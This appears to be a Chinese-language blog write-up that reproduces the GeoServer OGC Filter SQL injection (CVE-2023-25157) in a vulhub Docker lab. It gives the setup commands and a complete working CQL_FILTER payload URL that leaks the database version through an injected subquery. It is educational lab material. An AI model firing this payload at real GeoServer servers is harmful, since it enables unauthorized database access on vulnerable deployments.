# 原创
：  GeoServer OGC Filter SQL注入漏洞（CVE-2023-25157）vulhub漏洞复现

# GeoServer OGC Filter SQL注入漏洞（CVE-2023-25157）vulhub漏洞复现

### GeoServer OGC Filter SQL注入漏洞（CVE-2023-25157）

GeoServer是一款JAVA编写的、开源的、用于共享地理空间数据的软件服务器。GeoServer实现了 开放地理空间信息联盟(OGC )标准下WFS、WMS、WCS、WMTS等格式的发布。<br/> GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。在版本2.22.1和2.21.4及以前，多个OGC表达式中均存在SQL注入漏洞。

### vulhub漏洞复现

```
cd vulhub-master/
cd geoserver/
cd CVE-2023-25157
docker-compose build
docker-compose up -d
docker-compose ps

```

访问<br/> `http://192.168.126.128:8080/geoserver/web/?0`即可查看到GeoServer的首页。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/aa015b64ff834b47bbf756345bd1a355.png"/>

在利用漏洞前，需要目标服务器中存在类型是PostGIS的数据空间（datastore）和工作空间（workspace）。在Vulhub中，已经包含满足条件的工作空间，其信息如下：<br/> Workspace name: vulhub<br/> Data store name: pg<br/> Feature type (table) name: example<br/> One of attribute from feature type: name<br/> 构造payload

```
http://192.168.126.128:8080/geoserver/ows?service=WFS&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=vulhub:example&amp;CQL_FILTER=strStartsWith(name,'x'') = true and 1=(SELECT CAST ((SELECT version()) AS integer)) -- ') = true

```

成功注入获取版本信息。
